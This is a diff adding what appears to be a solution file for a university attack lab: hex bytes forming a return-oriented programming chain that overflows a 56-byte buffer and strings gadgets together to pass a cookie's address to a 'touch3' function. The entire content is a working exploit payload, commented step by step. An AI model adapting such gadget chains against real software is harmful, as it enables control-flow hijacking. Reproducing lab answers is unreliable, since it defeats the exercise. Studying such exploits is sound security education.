@@ -1,0 +1,29 @@
+                        /* fill buffer, take control of program stack */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* end of 56 byte buffer */
+                        
+                        /* set up ref point on stack */
+                        /* counter to addr rndmzr */
+2a 19 40 00 00 00 00 00 /* movq %rsp, %rax (gadget) */
+dc 18 40 00 00 00 00 00 /* movq %rax,%rdi (gadget) */
+
+                        /* send offset to cookie address for addition */
+f9 18 40 00 00 00 00 00 /* popq %rax (gadget) */
+48 00 00 00 00 00 00 00 /* offset to cookie address */
+8f 19 40 00 00 00 00 00 /* movl %eax,%edx (gadget) */
+53 19 40 00 00 00 00 00 /* movl %edx,%ecx (gadget) */
+b1 19 40 00 00 00 00 00 /* movl %ecx,%esi (gadget) */
+
+                        /* add ref point to offset for cookie addr */
+15 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax (gadget)*/ 
+dc 18 40 00 00 00 00 00 /* movq %rax,%rdi (gadget) */
+                    
+                        /* call to touch3 with cookie address */
+4c 18 40 00 00 00 00 00 /* call to touch3 address */
+31 64 36 66 38 66 61 35 /* ascii cookie */
+00 00 00 00 00 00 00 00
